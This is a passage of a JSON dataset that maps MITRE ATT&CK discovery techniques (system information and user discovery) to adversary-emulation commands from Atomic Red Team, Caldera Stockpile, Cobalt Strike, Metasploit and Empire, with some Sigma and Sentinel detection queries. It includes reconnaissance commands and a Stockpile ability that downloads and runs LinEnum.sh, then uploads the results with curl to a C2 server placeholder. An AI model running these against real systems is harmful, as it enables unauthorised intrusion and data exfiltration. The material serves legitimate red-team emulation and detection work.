{"last_updated": "2020-05-13T21:47:57.996647", "techniques": [{"technique_id": "T1082", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "ver", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell ver", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "set", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell set", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "get_env.rb", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net config workstation\nnet config server", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell net config workstation\nshell net config server", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "systeminfo [/s COMPNAME] [/u DOMAIN\\user] [/p password]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "systemprofiler tool if no access yet (victim browses to website)\nor\nshell systeminfo (if you already have a beacon)", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "sysinfo, run winenum, get_env.rb", "name": "Metasploit"}, {"source": "atomics/T1082/T1082.yaml", "command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "system_profiler\nls -al /Applications\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "uname -a >> /tmp/T1082.txt\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi;\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi;      \nif [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi;\nuptime >> /tmp/T1082.txt\ncat /tmp/T1082.txt 2>/dev/null\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi;\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi;\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi;\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi;\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi;\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi;\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "hostname\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "hostname\n", "name": null}, {"source": "atomics/T1082/T1082.yaml", "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n", "name": null}, {"source": "data/abilities/discovery/29451844-9b76-4e16-a9ee-d6feab4b24db.yml", "command": {"windows": {"psh,pwsh": {"command": "$PSVersionTable\n"}}}, "name": "Discover the PowerShell version"}, {"source": "data/abilities/discovery/30732a56-4a23-4307-9544-09caf2ed29d5.yml", "command": {"darwin": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}, "linux": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}}, "name": "Discover all directories containing deletable files by user"}, {"source": "data/abilities/discovery/46098c66-8d9a-4d23-8a95-dd5021c385ae.yml", "command": {"linux": {"sh": {"command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n", "cleanup": "rm ./LinEnum.sh;\nrm /tmp/exfil.txt;\n"}}}, "name": "Download and execute LinEnum.sh"}, {"source": "data/abilities/discovery/b6b105b9-41dc-490b-bc5c-80d699b82ce8.yml", "command": {"windows": {"psh": {"command": "[environment]::OSVersion.Version\n"}}}, "name": "Find OS Version"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/computerdetails", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/computerdetails", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/winenum", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/winenum", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_computer", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_computer", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1082", "Built-in Windows Command": "ver", "Cobalt Strike": "shell ver", "Metasploit": "", "Description": "Get the Windows OS version that's running"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1082", "Built-in Windows Command": "set", "Cobalt Strike": "shell set", "Metasploit": "get_env.rb", "Description": "Print all of the environment variables"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1082", "Built-in Windows Command": "net config workstation\nnet config server", "Cobalt Strike": "shell net config workstation\nshell net config server", "Metasploit": "", "Description": "Get computer name, username, OS software version, domain information, DNS, logon domain"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1082", "Built-in Windows Command": "systeminfo [/s COMPNAME] [/u DOMAIN\\user] [/p password]", "Cobalt Strike": "systemprofiler tool if no access yet (victim browses to website)\nor\nshell systeminfo (if you already have a beacon)", "Metasploit": "sysinfo, run winenum, get_env.rb", "Description": "Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties, such as RAM, disk space, and network cards"}}, {"Atomic Red Team Test - System Information Discovery": {"attack_technique": "T1082", "display_name": "System Information Discovery", "atomic_tests": [{"name": "System Information Discovery", "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n"}}, {"name": "System Information Discovery", "description": "Identify System Info\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "system_profiler\nls -al /Applications\n"}}, {"name": "List OS Information", "description": "Identify System Info\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Output file used to store the results.", "type": "path", "default": "/tmp/T1082.txt"}}, "executor": {"name": "sh", "command": "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi;\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi;      \nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi;\nuptime >> #{output_file}\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm #{output_file} 2>/dev/null\n"}}, {"name": "Linux VM Check via Hardware", "description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi;\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi;\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi;\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi;\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi;\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi;\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"\n"}}, {"name": "Linux VM Check via Kernel Modules", "description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n"}}, {"name": "Hostname Discovery (Windows)", "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "hostname\n"}}, {"name": "Hostname Discovery", "description": "Identify system hostname for Linux and macOS systems.\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "bash", "elevation_required": false, "command": "hostname\n"}}, {"name": "Windows MachineGUID Discovery", "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n"}}]}}, {"Mitre Stockpile - Discover the PowerShell version": {"id": "29451844-9b76-4e16-a9ee-d6feab4b24db", "name": "PowerShell version", "description": "Discover the PowerShell version", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "System Information Discovery"}, "platforms": {"windows": {"psh,pwsh": {"command": "$PSVersionTable\n"}}}}}, {"Mitre Stockpile - Discover all directories containing deletable files by user": {"id": "30732a56-4a23-4307-9544-09caf2ed29d5", "name": "Find deletable dirs (per user)", "description": "Discover all directories containing deletable files by user", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "System Information Discovery"}, "platforms": {"darwin": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}, "linux": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}]}}, {"Mitre Stockpile - Download and execute LinEnum.sh": {"id": "46098c66-8d9a-4d23-8a95-dd5021c385ae", "name": "Linux Enumeration & Privilege Escalation Discovery Script", "description": "Download and execute LinEnum.sh", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "system information discovery"}, "platforms": {"linux": {"sh": {"command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n", "cleanup": "rm ./LinEnum.sh;\nrm /tmp/exfil.txt;\n"}}}}}, {"Mitre Stockpile - Find OS Version": {"id": "b6b105b9-41dc-490b-bc5c-80d699b82ce8", "name": "Find OS Version", "description": "Find OS Version", "tactic": "discovery", "technique": {"attack_id": "T1082", "name": "System Information Discovery"}, "platforms": {"windows": {"psh": {"command": "[environment]::OSVersion.Version\n"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/host/computerdetails", "ATT&CK Technique #1": "T1082", "ATT&CK Technique #2": "T1005", "Technique": "System Information Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/computerdetails\":  [\"T1082\",\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/host/winenum", "ATT&CK Technique #1": "T1082", "ATT&CK Technique #2": "", "Technique": "System Information Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/winenum\":  [\"T1082\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_computer", "ATT&CK Technique #1": "T1082", "ATT&CK Technique #2": "", "Technique": "System Information Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_computer\":  [\"T1082\"],"}}], "command_list": ["ver", "shell ver", "set", "shell set", "get_env.rb", "net config workstation\nnet config server", "shell net config workstation\nshell net config server", "systeminfo [/s COMPNAME] [/u DOMAIN\\user] [/p password]", "systemprofiler tool if no access yet (victim browses to website)\nor\nshell systeminfo (if you already have a beacon)", "sysinfo, run winenum, get_env.rb", "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n", "system_profiler\nls -al /Applications\n", "uname -a >> /tmp/T1082.txt\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi;\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi;      \nif [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi;\nuptime >> /tmp/T1082.txt\ncat /tmp/T1082.txt 2>/dev/null\n", "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi;\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi;\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi;\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi;\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi;\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi;\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"\n", "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n", "hostname\n", "hostname\n", "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n", {"windows": {"psh,pwsh": {"command": "$PSVersionTable\n"}}}, {"darwin": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}, "linux": {"sh": {"command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"}}}, {"linux": {"sh": {"command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n", "cleanup": "rm ./LinEnum.sh;\nrm /tmp/exfil.txt;\n"}}}, {"windows": {"psh": {"command": "[environment]::OSVersion.Version\n"}}}, "powershell/situational_awareness/host/computerdetails", "powershell/situational_awareness/host/computerdetails", "powershell/situational_awareness/host/winenum", "powershell/situational_awareness/host/winenum", "powershell/situational_awareness/network/powerview/get_computer", "powershell/situational_awareness/network/powerview/get_computer"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains\"sysinfo.exe\"or process_path contains \"reg.exe\")and process_command_line contains \"reg*query HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum\"", "name": "System Information Discovery"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: Information found in the windows system\ndescription: windows server 2012 test results\nreferences: https://github.com/0xpwntester/CB-Threat-Hunting/blob/master/ATT%26CK/T1082-%20systeminfo%20executions.md\ntags: T1082\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ systeminfo.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Tokenpromotiontype: 'TokenElevationTypeDefault (1)' # token type lifting\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: 'systeminfo' # command-line process\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Reconnaissance Activity with Net Command", "id": "2887e914-ce96-435f-8105-593937e90757", "status": "experimental", "description": "Detects a set of commands often used in recon stages by different attack groups", "references": ["https://twitter.com/haroonmeer/status/939099379834658817", "https://twitter.com/c_APT_ure/status/939475433711722497", "https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html"], "author": "Florian Roth, Markus Neis", "date": "2018/08/22", "modified": "2018/12/11", "tags": ["attack.discovery", "attack.t1087", "attack.t1082", "car.2016-03-001"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["tasklist", "net time", "systeminfo", "whoami", "nbtstat", "net start", "*\\net1 start", "qprocess", "nslookup", "hostname.exe", "*\\net1 user /domain", "*\\net1 group /domain", "*\\net1 group \"domain admins\" /domain", "*\\net1 group \"Exchange Trusted Subsystem\" /domain", "*\\net1 accounts /domain", "*\\net1 user net localgroup administrators", "netstat -an"]}, "timeframe": "15s", "condition": "selection | count() by CommandLine > 4"}, "falsepositives": ["False positives depend on scripts and administrative tools used in the monitored environment"], "level": "medium"}}]}, {"technique_id": "T1033", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "whoami /all /fo list", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell whoami /all /fo list", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "getuid", "name": "Metasploit"}, {"source": "atomics/T1033/T1033.yaml", "command": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"localhost\"\nquser\nqwinsta.exe\" /server:localhost\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n", "name": null}, {"source": "atomics/T1033/T1033.yaml", "command": "users\nw\nwho\n", "name": null}, {"source": "data/abilities/discovery/aaf34d82-aea9-4278-8ec4-789653e4f5d9.yml", "command": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "payloads": ["powerview.ps1"]}}}, "name": "Get Administrator users for a computer"}, {"source": "data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml", "command": {"darwin": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "linux": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "windows": {"psh": {"command": "$env:username\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}, "cmd": {"command": "echo %username%", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}}, "name": "Find user running agent"}, {"source": "data/abilities/discovery/f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c.yml", "command": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "payloads": ["powerview.ps1"]}}}, "name": "Get Service Accounts for a domain"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/bloodhound", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/bloodhound", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_session", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_session", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1033", "Built-in Windows Command": "whoami /all /fo list", "Cobalt Strike": "shell whoami /all /fo list", "Metasploit": "getuid", "Description": "Get current user information, SID, domain, groups the user belongs to, security privs of the user"}}, {"Atomic Red Team Test - System Owner/User Discovery": {"attack_technique": "T1033", "display_name": "System Owner/User Discovery", "atomic_tests": [{"name": "System Owner/User Discovery", "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "Name of remote computer", "type": "string", "default": "localhost"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe\" /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n"}}, {"name": "System Owner/User Discovery", "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n", "supported_platforms": ["linux", "macos"], "executor": {"name": "sh", "elevation_required": false, "command": "users\nw\nwho\n"}}]}}, {"Mitre Stockpile - Get Administrator users for a computer": {"id": "aaf34d82-aea9-4278-8ec4-789653e4f5d9", "name": "GetAdminMembers", "description": "Get Administrator users for a computer", "tactic": "discovery", "technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "payloads": ["powerview.ps1"]}}}}}, {"Mitre Stockpile - Find user running agent": {"id": "c0da588f-79f0-4263-8998-7496b1a40596", "name": "Identify active user", "description": "Find user running agent", "tactic": "discovery", "technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "platforms": {"darwin": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "linux": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "windows": {"psh": {"command": "$env:username\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}, "cmd": {"command": "echo %username%", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}}}}, {"Mitre Stockpile - Get Service Accounts for a domain": {"id": "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c", "name": "GetServiceAccounts", "description": "Get Service Accounts for a domain", "tactic": "discovery", "technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "payloads": ["powerview.ps1"]}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/bloodhound", "ATT&CK Technique #1": "T1033", "ATT&CK Technique #2": "", "Technique": "System Owner/User Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/bloodhound\":  [\"T1033\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_session", "ATT&CK Technique #1": "T1033", "ATT&CK Technique #2": "", "Technique": "System Owner/User Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_session\":  [\"T1033\"],"}}], "command_list": ["whoami /all /fo list", "shell whoami /all /fo list", "getuid", "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"localhost\"\nquser\nqwinsta.exe\" /server:localhost\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\n", "users\nw\nwho\n", {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "payloads": ["powerview.ps1"]}}}, {"darwin": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "linux": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "windows": {"psh": {"command": "$env:username\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}, "cmd": {"command": "echo %username%", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}}, {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.user.name", "json_key": "samaccountname", "json_type": ["str"]}]}, "payloads": ["powerview.ps1"]}}}, 